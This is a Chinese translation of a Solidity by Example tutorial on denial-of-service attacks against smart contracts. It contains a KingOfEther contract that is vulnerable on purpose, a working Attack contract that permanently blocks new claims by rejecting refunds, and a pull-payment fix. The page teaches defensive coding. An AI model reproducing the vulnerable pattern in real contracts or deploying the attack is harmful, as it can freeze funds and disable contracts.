# 拒绝服务攻击

对应英文原页：https://solidity-by-example.org/hacks/denial-of-service

## 漏洞

有很多方法可以攻击智能合约，使其无法使用。

我们在这里介绍的一种利用方式，是让发送 Ether 的函数失败，从而造成拒绝服务（denial of service）。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

/*
KingOfEther 的目标是通过发送比前任国王更多的 Ether 来成为国王。
前任国王会收到他当时发送的 Ether 退款。
*/

/*
1. 部署 KingOfEther
2. Alice 通过向 claimThrone() 发送 1 Ether 成为国王。
3. Bob 通过向 claimThrone() 发送 2 Ether 成为国王。
   Alice 收到 1 Ether 退款。
4. 使用 KingOfEther 的地址部署 Attack。
5. 调用 attack 并发送 3 Ether。
6. 当前国王是 Attack 合约，没有人能再成为新国王。

发生了什么？
Attack 成为了国王。所有新的王位挑战都会被拒绝，
因为 Attack 合约没有 fallback 函数，拒绝接受
KingOfEther 在设置新国王之前发送的 Ether。
*/

contract KingOfEther {
    address public king;
    uint256 public balance;

    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

        (bool sent,) = king.call{value: balance}("");
        require(sent, "Failed to send Ether");

        balance = msg.value;
        king = msg.sender;
    }
}

contract Attack {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    // 你也可以通过使用 assert 消耗全部 gas 来进行 DOS。
    // 即使调用方合约不检查
    // 调用是否成功，这种攻击仍然有效。
    //
    // function () external payable {
    //     assert(false);
    // }

    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}
```

## 预防措施

一种预防方法是让用户自己提取 Ether，而不是由合约发送。

下面是一个例子。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract KingOfEther {
    address public king;
    uint256 public balance;
    mapping(address => uint256) public balances;

    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

        balances[king] += balance;

        balance = msg.value;
        king = msg.sender;
    }

    function withdraw() public {
        require(msg.sender != king, "Current king cannot withdraw");

        uint256 amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent,) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}
```

---
## 关注我们
[Yanbo的Twitter](https://x.com/Yanbo2004)｜[Web3Club的Twitter](https://twitter.com/Web3ClubCN)


[加入我们](https://github.com/Web3-Club/Intro./blob/main/Join%20club.md)
